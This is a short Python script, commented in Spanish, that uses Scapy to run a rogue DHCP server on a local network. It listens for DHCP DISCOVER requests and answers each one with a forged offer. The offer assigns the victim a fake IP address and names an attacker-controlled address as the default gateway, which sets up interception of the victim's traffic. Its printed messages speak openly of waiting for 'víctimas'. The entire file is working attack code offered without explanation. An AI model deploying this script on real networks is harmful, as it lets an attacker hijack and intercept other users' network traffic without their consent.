from scapy.all import *

iface = "eth0"

fake_gateway = "10.9.23.100"
fake_dns = "8.8.8.8"
network_mask = "255.255.255.0"

print("DHCP ROGUE activo... esperando víctimas")

def handle_dhcp(packet):

    if packet.haslayer(DHCP):

        if packet[DHCP].options[0][1] == 1:  # DHCP DISCOVER

            victim_mac = packet[Ether].src
            victim_xid = packet[BOOTP].xid

            offered_ip = "10.9.23." + str(randint(150,200))

            print(f"Asignando IP falsa {offered_ip} a {victim_mac}")

            dhcp_offer = (
                Ether(dst=victim_mac, src=RandMAC()) /
                IP(src=fake_gateway, dst="255.255.255.255") /
                UDP(sport=67, dport=68) /
                BOOTP(op=2, yiaddr=offered_ip, siaddr=fake_gateway, xid=victim_xid) /
                DHCP(options=[
                    ("message-type","offer"),
                    ("server_id", fake_gateway),
                    ("lease_time", 86400),
                    ("subnet_mask", network_mask),
                    ("router", fake_gateway),
                    ("name_server", fake_dns),
                    "end"
                ])
            )

            sendp(dhcp_offer, iface=iface, verbose=False)

sniff(filter="udp and (port 67 or 68)", prn=handle_dhcp, iface=iface)
